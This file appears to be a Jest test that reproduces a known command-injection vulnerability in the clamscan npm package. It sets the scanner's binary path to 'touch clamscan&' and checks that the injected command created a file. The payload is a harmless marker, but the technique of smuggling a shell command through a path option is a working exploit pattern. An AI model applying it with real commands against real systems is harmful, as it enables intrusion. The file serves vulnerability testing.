//https://snyk.io/vuln/SNYK-JS-CLAMSCAN-564113
test("Command Injection in clamscan", () => {
  const Root = require("clamscan");
  const fs = require("fs");
  const path = "./clamscan";
  const sleep = require("sleep");
  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  var attack_code = "touch clamscan";
  var root = new Root();
  let run = root.init({ clamscan: { path: attack_code + "&" } });
  run.then(() => {
    sleep.sleep(5);
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  });
});
